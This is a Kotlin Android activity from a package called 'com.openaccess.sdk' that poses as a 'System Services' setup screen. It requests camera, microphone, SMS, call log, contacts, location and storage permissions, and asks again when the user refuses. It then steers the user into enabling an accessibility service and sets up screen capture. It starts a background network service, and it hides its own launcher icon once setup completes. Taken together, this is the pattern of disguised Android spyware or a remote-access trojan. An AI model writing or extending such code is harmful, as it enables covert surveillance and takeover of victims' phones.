package com.openaccess.sdk

import android.Manifest
import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.app.Activity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.DisplayCapture
import com.openaccess.sdk.service.SystemNetworkService

@Suppress("DEPRECATION")
class MainActivity : Activity() {
    companion object {
        private const val RC_ALL = 100
        private const val RC_SCREEN = 101
        private const val RC_NOTIF = 102
        const val ACTION_REQUEST_SCREEN = "com.openaccess.sdk.REQUEST_SCREEN"

        val CORE_PERMS = listOfNotNull(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.READ_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
        )

        val NOTIF_PERM = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.POST_NOTIFICATIONS else null

        val ALL_PERMS = CORE_PERMS + listOfNotNull(NOTIF_PERM)

        val PERM_LABELS = mapOf(
            Manifest.permission.CAMERA to "Camera",
            Manifest.permission.CALL_PHONE to "Phone Calls",
            Manifest.permission.READ_CALL_LOG to "Call History",
            Manifest.permission.SEND_SMS to "Send SMS",
            Manifest.permission.READ_CONTACTS to "Contacts",
            Manifest.permission.WRITE_CONTACTS to "Edit Contacts",
            Manifest.permission.RECORD_AUDIO to "Microphone",
            Manifest.permission.READ_SMS to "Read SMS",
            Manifest.permission.READ_PHONE_STATE to "Phone State",
            Manifest.permission.ACCESS_COARSE_LOCATION to "Location",
            Manifest.permission.ACCESS_FINE_LOCATION to "Precise Location",
            Manifest.permission.READ_EXTERNAL_STORAGE to "Read Storage",
            Manifest.permission.WRITE_EXTERNAL_STORAGE to "Write Storage",
            Manifest.permission.POST_NOTIFICATIONS to "Notifications",
        )

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }

        fun isServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
            return try {
                val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                    if (serviceClass.name == service.service.className) return true
                }
                false
            } catch (_: Exception) {
                false
            }
        }
    }

    private lateinit var permContainer: LinearLayout
    private lateinit var statusText: TextView
    private lateinit var enableAllBtn: Button
    private lateinit var progressBar: ProgressBar
    private val permSwitches = mutableMapOf<String, TextView>()
    private var retryCount = 0
    private var requestingNotif = false
    private lateinit var rootLayout: LinearLayout

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            try {
                val projIntent = DisplayCapture.getProjectionIntent(this@MainActivity)
                startActivityForResult(projIntent, RC_SCREEN)
            } catch (_: Exception) {}
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        try { SystemNetworkService.start(this) } catch (_: Exception) {}
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN), Context.RECEIVER_NOT_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN))
            }
        } catch (_: Exception) {}

        rootLayout = createPermissionView()
        setContentView(rootLayout)
        refreshPermissionStates()

        if (ALL_PERMS.all { hasPermission(this, it) } && isAccessibilityEnabled(this)) {
            onSetupComplete()
        }
    }

    private fun dp(dip: Int): Int {
        return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dip.toFloat(), resources.displayMetrics).toInt()
    }

    private fun cardBg(): GradientDrawable {
        return GradientDrawable().apply {
            setColor(Color.parseColor("#12121A"))
            cornerRadius = dp(12).toFloat()
        }
    }

    private fun createPermissionView(): LinearLayout {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0A0A0F"))
            setPadding(dp(24), dp(48), dp(24), dp(24))
        }

        val icon = TextView(this).apply {
            text = "\uD83D\uDEE1\uFE0F"
            textSize = 36f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
        }

        val title = TextView(this).apply {
            text = "System Services"
            textSize = 22f
            setTextColor(Color.parseColor("#E8E8F0"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(4))
        }

        val subtitle = TextView(this).apply {
            text = "Configure permissions to continue"
            textSize = 13f
            setTextColor(Color.parseColor("#6B6B80"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(20))
        }

        statusText = TextView(this).apply {
            textSize = 12f
            setTextColor(Color.parseColor("#00F0FF"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
        }

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(4)
            ).apply { setMargins(0, 0, 0, dp(16)) }
            progressDrawable = GradientDrawable().apply {
                setColor(Color.parseColor("#1A1A2E"))
            }
            max = 100
            progress = 0
        }

        val scroll = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }

        permContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        for (perm in ALL_PERMS) {
            val label = PERM_LABELS[perm] ?: perm.substringAfterLast(".")
            val card = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { setMargins(0, 0, 0, dp(6)) }
                background = cardBg()
                setPadding(dp(16), dp(12), dp(16), dp(12))
                gravity = Gravity.CENTER_VERTICAL
            }

            val indicator = TextView(this).apply {
                text = "\u25CB"
                textSize = 16f
                setTextColor(Color.parseColor("#3A3A4A"))
                setPadding(0, 0, dp(12), 0)
            }

            val tv = TextView(this).apply {
                text = label
                textSize = 14f
                setTextColor(Color.parseColor("#B0B0C0"))
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            }

            val status = TextView(this).apply {
                text = "DENIED"
                textSize = 10f
                setTextColor(Color.parseColor("#FF3B3B"))
                setPadding(dp(8), dp(4), dp(8), dp(4))
            }

            card.addView(indicator)
            card.addView(tv)
            card.addView(status)
            permContainer.addView(card)

            permSwitches[perm] = tv
            tv.tag = Pair(indicator, status)
        }

        scroll.addView(permContainer)

        enableAllBtn = Button(this).apply {
            text = "Grant All Permissions"
            textSize = 15f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#00F0FF"))
            setPadding(0, dp(14), 0, dp(14))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                topMargin = dp(16)
                bottomMargin = dp(8)
            }
            setOnClickListener { requestAllPerms() }
        }

        val skipBtn = TextView(this).apply {
            text = "Skip"
            textSize = 13f
            setTextColor(Color.parseColor("#4A4A5A"))
            gravity = Gravity.CENTER
            setPadding(0, dp(12), 0, dp(12))
            setOnClickListener { onSetupComplete() }
        }

        root.addView(icon)
        root.addView(title)
        root.addView(subtitle)
        root.addView(statusText)
        root.addView(progressBar)
        root.addView(scroll)
        root.addView(enableAllBtn)
        root.addView(skipBtn)

        return root
    }

    private fun createAccessibilityView(): LinearLayout {
        val overlay = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0A0A0F"))
            setPadding(dp(24), dp(48), dp(24), dp(24))
            gravity = Gravity.CENTER
        }

        val icon = TextView(this).apply {
            text = "\u2699\uFE0F"
            textSize = 40f
            setPadding(0, 0, 0, dp(16))
        }

        val title = TextView(this).apply {
            text = "Enable Service"
            textSize = 22f
            setTextColor(Color.parseColor("#E8E8F0"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
        }

        val desc = TextView(this).apply {
            text = "Turn on 'System Services' in the next screen to complete setup"
            textSize = 14f
            setTextColor(Color.parseColor("#6B6B80"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(32))
        }

        val openBtn = Button(this).apply {
            text = "Open Settings"
            textSize = 15f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#00F0FF"))
            setPadding(0, dp(14), 0, dp(14))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener {
                try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (_: Exception) {}
            }
        }

        val backBtn = TextView(this).apply {
            text = "Back"
            textSize = 13f
            setTextColor(Color.parseColor("#4A4A5A"))
            gravity = Gravity.CENTER
            setPadding(0, dp(16), 0, 0)
            setOnClickListener {
                rootLayout = createPermissionView()
                setContentView(rootLayout)
                refreshPermissionStates()
            }
        }

        overlay.addView(icon)
        overlay.addView(title)
        overlay.addView(desc)
        overlay.addView(openBtn)
        overlay.addView(backBtn)
        return overlay
    }

    private fun refreshPermissionStates() {
        var granted = 0
        val total = ALL_PERMS.size

        for ((perm, tv) in permSwitches) {
            val has = hasPermission(this, perm)
            val (indicator, status) = tv.tag as Pair<*, *>
            if (has) {
                granted++
                (indicator as TextView).text = "\u25CF"
                (indicator as TextView).setTextColor(Color.parseColor("#39FF14"))
                (status as TextView).text = "GRANTED"
                (status as TextView).setTextColor(Color.parseColor("#39FF14"))
                tv.setTextColor(Color.parseColor("#E8E8F0"))
            } else {
                (indicator as TextView).text = "\u25CB"
                (indicator as TextView).setTextColor(Color.parseColor("#3A3A4A"))
                (status as TextView).text = "DENIED"
                (status as TextView).setTextColor(Color.parseColor("#FF3B3B"))
                tv.setTextColor(Color.parseColor("#B0B0C0"))
            }
        }

        val pct = if (total > 0) (granted * 100 / total) else 0
        progressBar.progress = pct
        statusText.text = "$granted / $total granted"
        statusText.setTextColor(if (granted == total) Color.parseColor("#39FF14") else Color.parseColor("#00F0FF"))
        enableAllBtn.isEnabled = granted < total
        enableAllBtn.text = if (granted == total) "All Granted" else "Grant All Permissions"
        enableAllBtn.setBackgroundColor(
            if (granted == total) Color.parseColor("#1A3A1A") else Color.parseColor("#00F0FF")
        )
    }

    private fun requestAllPerms() {
        val needed = CORE_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            requestNotifPermission()
            return
        }

        val batchSize = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) 4 else 6
        val batch = needed.take(batchSize)

        try {
            ActivityCompat.requestPermissions(this, batch.toTypedArray(), RC_ALL)
        } catch (_: Exception) {
            statusText.text = "Tap again to continue"
        }
    }

    private fun requestNotifPermission() {
        if (NOTIF_PERM == null) {
            checkAndProceed()
            return
        }
        if (hasPermission(this, NOTIF_PERM)) {
            checkAndProceed()
            return
        }
        requestingNotif = true
        try {
            ActivityCompat.requestPermissions(this, arrayOf(NOTIF_PERM), RC_NOTIF)
        } catch (_: Exception) {
            requestingNotif = false
            checkAndProceed()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RC_SCREEN) {
            if (resultCode == RESULT_OK && data != null) {
                DisplayCapture.setProjection(resultCode, data)
                val ok = DisplayCapture.initProjection(this)
                statusText.text = if (ok) "Screen capture active" else "Screen capture failed"
            } else {
                statusText.text = "Screen capture denied"
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)

        if (requestCode == RC_NOTIF) {
            requestingNotif = false
            refreshPermissionStates()
            checkAndProceed()
            return
        }

        if (requestCode == RC_ALL) {
            refreshPermissionStates()

            val denied = CORE_PERMS.filter { !hasPermission(this, it) }
            if (denied.isEmpty()) {
                retryCount = 0
                requestNotifPermission()
            } else {
                retryCount++
                if (retryCount < 3) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        requestAllPerms()
                    }, 800)
                } else {
                    statusText.text = "Enable remaining in Settings"
                    enableAllBtn.text = "Open Settings"
                    enableAllBtn.setOnClickListener { openAppSettings() }
                }
            }
        }
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)

        when {
            !permsOk -> requestAllPerms()
            !accOk -> setContentView(createAccessibilityView())
            else -> onSetupComplete()
        }
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun onSetupComplete() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        startActivity(Intent(this, VpnActivity::class.java))
        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || !::rootLayout.isInitialized) return
        if (requestingNotif) return

        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)

        if (permsOk && accOk) {
            onSetupComplete()
        } else if (permsOk) {
            setContentView(createAccessibilityView())
        } else {
            refreshPermissionStates()
        }
    }

    override fun onPause() {
        super.onPause()
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
    }
}
